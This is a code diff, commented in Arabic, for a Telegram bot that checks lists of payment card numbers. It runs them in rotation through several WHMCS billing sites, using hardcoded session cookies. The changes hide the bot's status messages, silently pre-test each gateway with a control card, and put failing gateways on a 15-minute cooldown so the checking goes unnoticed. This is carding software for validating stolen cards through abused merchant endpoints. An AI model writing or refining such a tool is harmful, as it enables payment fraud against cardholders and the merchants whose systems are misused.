@@ -41,7 +41,7 @@ GATEWAYS = [
             'WHMCSPKhB4ecIIbla': '7e05fba0b7e930c906ce8cdb6eb060da',
         },
         "active": True,
-        "processed_count": 0,  # عداد خاص بهذه البوابة فقط
+        "processed_count": 0,
         "cooldown_until": 0
     },
     {
@@ -57,7 +57,7 @@ GATEWAYS = [
             'WHMCSUser': '6125%3A%3A7da785e673fb9cd6a96ee730b1d3e9fc5ee1a853',
         },
         "active": True,
-        "processed_count": 0,  # عداد خاص بهذه البوابة فقط
+        "processed_count": 0,
         "cooldown_until": 0
     },
     {
@@ -71,7 +71,7 @@ GATEWAYS = [
             'WHMCSfJ1XkWUErbVN': '9ur34qe7208kf4q92esim7dvk5',
         },
         "active": True,
-        "processed_count": 0,  # عداد خاص بهذه البوابة فقط
+        "processed_count": 0,
         "cooldown_until": 0
     },
     {
@@ -85,7 +85,7 @@ GATEWAYS = [
             'WHMCS6gnIyj0tBZJA': 'or7eg2ni1n5mrdlrjpabqo31ol',
         },
         "active": True,
-        "processed_count": 0,  # عداد خاص بهذه البوابة فقط
+        "processed_count": 0,
         "cooldown_until": 0
     }
 ]
@@ -260,7 +260,7 @@ def set_test_card(message):
         return
 
     GLOBAL_TEST_CARD = card
-    bot.reply_to(message, f"✅ <b>تم ضبط فيزا الاختبار الخاصة بنجاح!</b>\n💳 <code>{card}</code>\nسيتم استخدامها لتجربة كل بوابة بعد أن تفحص 10 بطاقات خاصة بها.", parse_mode='HTML')
+    bot.reply_to(message, f"✅ <b>تم ضبط فيزا الاختبار الخاصة بنجاح!</b>\n💳 <code>{card}</code>", parse_mode='HTML')
 
 @bot.message_handler(commands=["start"])
 def start_command(message):
@@ -302,7 +302,6 @@ def handle_combo_file(message):
         bot.reply_to(message, f"""
 📁 <b>تم استلام الملف بنجاح!</b>
 📊 عدد البطاقات الإجمالي: {len(cards)}
-🔄 النمط: توزيع دوري (كل بوابة يفحص فيها 10 بطاقات مستقلة ثم يختبرها بالـ /cc)
 ⚡ <b>جاري بدء الفحص...</b>
 """, parse_mode='HTML')
         
@@ -316,39 +315,36 @@ def process_auto_rotation_combo(chat_id, cards):
     approved = 0
     declined = 0
     results_list = []
-    
-    # تصفير عداد البطاقات لكل بوابة بشكل مستقل
-    for g in GATEWAYS:
-        g['processed_count'] = 0
 
     status_msg = bot.send_message(chat_id, f"🚀 جاري الفحص بالتداول على البوابات...\n━━━━━━━━━━━━━━━━━━━━━", parse_mode='HTML')
-    
-    gateway_index = 0
 
+    # =============== فحص البوابات أول الملف صامتاً ===============
+    if GLOBAL_TEST_CARD:
+        for g in GATEWAYS:
+            # يفحص البوابة فقط إذا لم تكن في فترة الراحة بالفعل
+            if time.time() >= g.get("cooldown_until", 0):
+                test_res = check_card_with_gateway(GLOBAL_TEST_CARD, g)
+                if "APPROVED" not in test_res:
+                    g['cooldown_until'] = time.time() + 900  # حظر البوابة 15 دقيقة
+                g['processed_count'] = 0  # تصفير عداد البطاقات
+
+    # =============== بدء فحص الكومبو ===============
     for i, card in enumerate(cards, 1):
-        # البحث عن بوابة جاهزة وليست في فترة راحة
+        # 1. البحث الآلي عن بوابة جاهزة (تتجاوز فترة الراحة تلقائياً)
         assigned_gateway = None
-        attempts = 0
-        
-        while attempts < len(GATEWAYS):
-            candidate = GATEWAYS[gateway_index % len(GATEWAYS)]
-            gateway_index += 1
-            attempts += 1
+        while not assigned_gateway:
+            current_time = time.time()
+            for g in GATEWAYS:
+                if current_time >= g.get("cooldown_until", 0):
+                    assigned_gateway = g
+                    break
             
-            # التأكد أن البوابة لا تخضع لراحة الـ 15 دقيقة
-            if time.time() >= candidate.get("cooldown_until", 0):
-                assigned_gateway = candidate
-                break
+            # إذا كانت جميع البوابات متوقفة في فترة راحة، ينتظر 30 ثانية ويعيد المحاولة
+            if not assigned_gateway:
+                time.sleep(30)
 
-        if not assigned_gateway:
-            bot.send_message(chat_id, "⚠️ **جميع البوابات في فترة راحة (15 دقيقة)!**\nجاري الانتظار 30 ثانية قبل المحاولة...", parse_mode='HTML')
-            time.sleep(30)
-            assigned_gateway = GATEWAYS[0]
-
-        # 1. فحص بطاقة من الملف على البوابة المختارة
+        # 2. فحص البطاقة من الملف على البوابة المختارة
         result = check_card_with_gateway(card, assigned_gateway)
-        
-        # زيادة عداد البطاقات المفحوصة لهذه البوابة بالتحديد (+1)
         assigned_gateway['processed_count'] += 1
 
         if "APPROVED" in result:
@@ -368,31 +364,31 @@ def process_auto_rotation_combo(chat_id, cards):
             declined += 1
             results_list.append(f"💳 <code>{card[:12]}...</code> → {result} [{assigned_gateway['name']}]")
 
-        # 2. فحص هل وصلت هذه البوابة تحديداً إلى 10 بطاقات؟
+        # 3. التحقق التلقائي عند الوصول لـ 10 بطاقات
         if assigned_gateway['processed_count'] >= 10:
-            assigned_gateway['processed_count'] = 0  # تصفير عداد هذه البوابة فقط
+            assigned_gateway['processed_count'] = 0  # إعادة ضبط العداد
             
             if GLOBAL_TEST_CARD:
-                bot.send_message(chat_id, f"🔍 <b>وصلت البوابة ({assigned_gateway['name']}) إلى 10 بطاقات! جاري فحص بطاقة الـ /cc عليها...</b>", parse_mode='HTML')
                 test_res = check_card_with_gateway(GLOBAL_TEST_CARD, assigned_gateway)
-                
-                if "APPROVED" in test_res:
-                    bot.send_message(chat_id, f"✅ <b>اختبار البوابة ({assigned_gateway['name']}) نجح!</b> مستمرة في العمل.", parse_mode='HTML')
-                else:
-                    assigned_gateway['cooldown_until'] = time.time() + 900  # إراحة البوابة 15 دقيقة (900 ثانية)
-                    bot.send_message(chat_id, f"⚠️ <b>البوابة ({assigned_gateway['name']}) فشلت في فحص بطاقة الاختبار!</b>\n⏸️ سيتم إراحة هذه البوابة لمدة 15 دقيقة وتحويل البطاقات إلى باقي البوابات.", parse_mode='HTML')
+                # إذا فشلت البوابة في الاختبار، يتم إيقافها تلقائياً وبصمت لمدة 15 دقيقة
+                if "APPROVED" not in test_res:
+                    assigned_gateway['cooldown_until'] = time.time() + 900
 
-        # تحديث لوحة النتائج في تلجرام
+        # 4. تحديث رسالة التقدم الرئيسية فقط
         if i % 3 == 0 or i == total:
             recent_results = "\n".join(results_list[-5:]) if results_list else "لا يوجد نتائج بعد"
-            stats_gateways = "\n".join([f"🔹 {g['name']}: {g['processed_count']}/10" for g in GATEWAYS])
+            stats_gateways = "\n".join([
+                f"🔹 {g['name']}: {g['processed_count']}/10 " + 
+                ("⏸️ (راحه)" if time.time() < g.get("cooldown_until", 0) else "✅") 
+                for g in GATEWAYS
+            ])
             
             progress_text = f"""
 📊 <b>متابعة التقدم الدوري</b>
 ━━━━━━━━━━━━━━━━━━━━━
 📌 الإجمالي: [{i}/{total}] | ✅ {approved} | ❌ {declined}
 ━━━━━━━━━━━━━━━━━━━━━
-<b>عداد البوابات الحالية (حتى الوصول لـ 10):</b>
+<b>حالة البوابات:</b>
 {stats_gateways}
 ━━━━━━━━━━━━━━━━━━━━━
 <b>آخر البطاقات المفحوصة:</b>
@@ -409,6 +405,5 @@ def process_auto_rotation_combo(chat_id, cards):
 
 # =============== تشغيل البوت ===============
 if __name__ == "__main__":
-    print("🚀 يعمل البوت الآن بالنظام الجديد: عداد 10 بطاقات مستقل لكل بوابة...")
+    print("🚀 يعمل البوت الآن بالنظام المطور تلقائياً مع فحص أولي للبوابات...")
     bot.infinity_polling()
-
